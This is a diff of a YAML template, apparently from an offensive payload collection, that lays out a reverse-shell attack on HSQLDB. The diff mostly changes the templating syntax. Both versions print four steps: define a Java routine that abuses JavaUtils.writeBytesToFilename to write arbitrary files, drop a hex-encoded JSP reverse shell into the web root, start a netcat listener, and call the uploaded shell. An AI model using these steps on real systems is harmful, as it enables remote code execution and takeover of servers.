@@ -1,18 +1,31 @@
----
 metadata:
-  filename: "revshell-linux-hsqldb-java-routine.yaml"
-  tags: ["shell"]
-  created: "2025-03-29"
-  author: "Unknown"
+  filename: revshell-linux-hsqldb-java-routine.yaml
+  tags:
+  - shell
+  created: '2025-03-29'
+  author: Unknown
+content: 'echo "1. Create Java Routine function that creates a file on the system:
 
-content: |
-  echo "1. Create Java Routine function that creates a file on the system:
   CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
+
   LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
-  'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"; \
+
+  ''CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename''";
+  \
+
   echo ""; \
-  echo "2. Adjust the path to save the file (reachable web path e.g. web root) and call the Java Routine function
-  call writetofile('/path/ROOT/shell.jsp', cast ('<%=$(esh payloads/revshell-linux-jsp-bash-hexencoded)%>' AS VARBINARY(1024)))"
+
+  echo "2. Adjust the path to save the file (reachable web path e.g. web root) and
+  call the Java Routine function
+
+  call writetofile(''/path/ROOT/shell.jsp'', cast (''{{ include(''payloads/revshell-linux-jsp-bash-hexencoded.yaml'')
+  }}'' AS VARBINARY(1024)))"
+
   echo ""; \
-  echo "3. Start a revshell listener: <%echo $(esh scripts/listener-nc)%>"; \
+
+  echo "3. Start a revshell listener: {{ include(''scripts/listener-nc.yaml'') }}";
+  \
+
   echo "4. Call the uploaded revshell"
+
+  '
